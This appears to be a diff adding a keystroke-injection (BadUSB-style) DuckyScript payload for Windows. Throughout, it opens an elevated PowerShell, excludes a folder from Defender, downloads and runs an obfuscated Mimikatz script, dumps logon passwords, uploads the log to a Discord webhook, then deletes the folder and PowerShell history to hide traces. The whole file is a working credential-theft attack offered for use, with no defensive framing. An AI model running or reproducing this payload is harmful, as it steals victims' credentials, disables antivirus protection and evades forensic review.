@@ -1,0 +1,64 @@
+REM Download and Execute mimikatz.ps1
+REM send data via discord webhook
+GUI r
+DELAY 500
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
+ENTER
+DELAY 1500
+ALT y
+DELAY 1000
+STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
+ENTER
+DELAY 500
+STRING A
+ENTER
+STRING clear
+ENTER
+DELAY 500
+STRING iwr https://raw.githubusercontent.com/HernanRodriguez1/MimikatzFUD/main/Invoke-M1m1fud2.ps1 -OutFile Invoke-M1m1fud2.ps1
+ENTER
+DELAY 4000
+STRING . .\Invoke-M1m1fud2.ps1 ; Invoke-M1m1fud
+ENTER
+DELAY 5000
+STRING privilege::debug
+ENTER
+DELAY 750
+STRING log
+ENTER
+DELAY 750
+STRING sekurlsa::logonpasswords
+ENTER
+STRING exit
+ENTER
+DELAY 8750
+GUI r
+DELAY 1500
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
+ENTER
+DELAY 1500
+ALT y
+DELAY 1000
+STRING cd C:\temp
+ENTER
+DELAY 500
+STRING $webhook="DISCORD_WEBHOOK"
+ENTER
+DELAY 500
+STRING $content='Flipper Flap Feport'; $payload=[PSCustomObject]@{ content=$content }
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -ContentType "Application/Json" -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json) ; curl.exe -F "file1=@mimikatz.log" $webhook
+ENTER
+DELAY 1000
+STRING Remove-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy restricted
+ENTER
+DELAY 1500
+STRING A
+ENTER
+DELAY 500
+STRING clear ; cd .. ; rm -r temp ; Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+DELAY 500
+STRING exit
+ENTER
